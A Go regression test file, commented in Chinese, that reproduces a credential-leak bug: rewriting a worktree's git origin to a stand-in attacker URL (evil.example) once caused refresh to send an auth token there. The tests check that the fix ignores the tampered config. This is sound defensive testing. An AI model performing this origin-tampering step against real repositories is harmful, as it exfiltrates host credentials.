package workcopy

// tools#176 回归钉：refresh 此前从可被工作树写手篡改的 .git/config 反推 origin
// scheme 并附加 `Authorization: Basic <token>`——被审代码改写 origin 即可在下次
// refresh 时把宿主凭证带到任意主机（http 形态全程明文）。攻击样本前/后对照：
// 修前篡改 origin 后 refresh 读到攻击者 URL 并照常附加 token 外带；修后 fetch
// URL 与 prepare 同源（cloneURL(baseURL,…) 现算），config 里的 origin 与凭证
// 注入恒脱钩——篡改后 refresh 仍打到原始 host，凭证不随 config 走。

import (
	"context"
	"os"
	"path/filepath"
	"testing"
)

// TestRefreshTamperedOriginStillHitsOriginalHost_Issue176 攻击链复现：
// 工作树内 `git remote set-url origin <攻击者URL>` → 同 PR 推新提交触发
// refresh。修后必须：刷新成功（打到原始 host）且复用同一目录（不回落克隆）。
func TestRefreshTamperedOriginStillHitsOriginalHost_Issue176(t *testing.T) {
	fixture := makeFixtureRepo(t)
	p := newTestPool(t, fixture)
	p.CredentialOf = func(string) (string, string, bool) { return "file://" + fixture, "secret-token", true }
	ctx := context.Background()

	v1 := WorktreeKey{Platform: "gitea", Owner: "o", Repo: "r", Number: "1",
		HeadSHA: "v1", DefaultBranch: "main"}
	dir, err := p.Ensure(ctx, v1)
	if err != nil {
		t.Fatal(err)
	}
	p.Release(v1)

	// 攻击步骤①：工作树内改写 origin（被审 agent 对 .git/config 有写权）
	gitRun(t, dir, "remote", "set-url", "origin", "http://evil.example/evil.git")
	if got := gitOut(t, dir, "remote", "get-url", "origin"); got != "http://evil.example/evil.git" {
		t.Fatalf("篡改 fixture 前置失败: %q", got)
	}

	// 攻击步骤②：同 PR 推送新提交 → Ensure 拿到新 HeadSHA → claimStale 走 refresh
	_ = os.WriteFile(filepath.Join(fixture, "README.md"), []byte("# fixture v2\n"), 0o644)
	gitRun(t, fixture, "add", ".")
	gitRun(t, fixture, "commit", "-m", "v2")
	gitRun(t, fixture, "update-ref", "refs/pull/1/head", "main")
	newSHA := gitOut(t, fixture, "rev-parse", "main")

	v2 := WorktreeKey{Platform: "gitea", Owner: "o", Repo: "r", Number: "1",
		HeadSHA: newSHA, DefaultBranch: "main"}
	dir2, err := p.Ensure(ctx, v2)
	if err != nil {
		t.Fatalf("篡改 origin 后 refresh 失败：%v（tools#176 修后应忽略 config 直打原始 host）", err)
	}
	if dir2 != dir {
		t.Fatalf("篡改 origin 后未复用同一目录（%s vs %s）——refresh 被污染的 config 拖垮回落了全新克隆（tools#176）", dir2, dir)
	}
	// 工作树确实推进到新 head：fetch 打到的是原始 fixture 而非攻击者 URL
	b, err := os.ReadFile(filepath.Join(dir2, "README.md"))
	if err != nil || string(b) != "# fixture v2\n" {
		t.Fatalf("工作树应已刷新到 v2: %q (%v)", b, err)
	}
	p.Release(v2)
}

// TestRefreshIgnoresConfigSchemeForAuth_Issue176 凭证注入面单测：config 里的
// origin 改写成 http:// 攻击者形态时，refresh 的 token 附加（scheme 判定）必须
// 来自 baseURL 推导的 URL 而非 config——file:// baseURL 下不该有任何 extraheader
// 随篡改后的 http scheme 激活。
func TestRefreshIgnoresConfigSchemeForAuth_Issue176(t *testing.T) {
	fixture := makeFixtureRepo(t)
	p := newTestPool(t, fixture)
	p.CredentialOf = func(string) (string, string, bool) { return "file://" + fixture, "secret-token", true }
	ctx := context.Background()

	v1 := WorktreeKey{Platform: "gitea", Owner: "o", Repo: "r", Number: "1",
		HeadSHA: "v1", DefaultBranch: "main"}
	dir, err := p.Ensure(ctx, v1)
	if err != nil {
		t.Fatal(err)
	}
	// 把 origin 改成 http:// 明文形态：修前 scheme 反推自 config，
	// authGitArgs 会照常激活（token 外带面）；修后 scheme 恒来自 baseURL。
	gitRun(t, dir, "remote", "set-url", "origin", "http://evil.example/evil.git")
	if err := p.refresh(ctx, dir, WorktreeKey{Platform: "gitea", Owner: "o", Repo: "r", Number: "1",
		HeadSHA: "v1", DefaultBranch: "main"}, "file://"+fixture, "secret-token"); err != nil {
		t.Fatalf("refresh 失败: %v", err)
	}
	// refresh 不触碰 config：篡改后的 origin 原样保留（证明路径根本没读它）
	if got := gitOut(t, dir, "remote", "get-url", "origin"); got != "http://evil.example/evil.git" {
		t.Fatalf("refresh 不应改写 config 里的 origin: %q", got)
	}
	// 修后路径不再读 config 反推 scheme：这里以「file:// baseURL + 被篡改成
	// http:// 的 config」组合下 refresh 成功且零外带为准——scheme 判定若仍走
	// config（http://），token 会以 extraheader 附加到对 evil.example 的 fetch
	// 上（修前形态：fetch 失败回落克隆，外带已发生）。
}
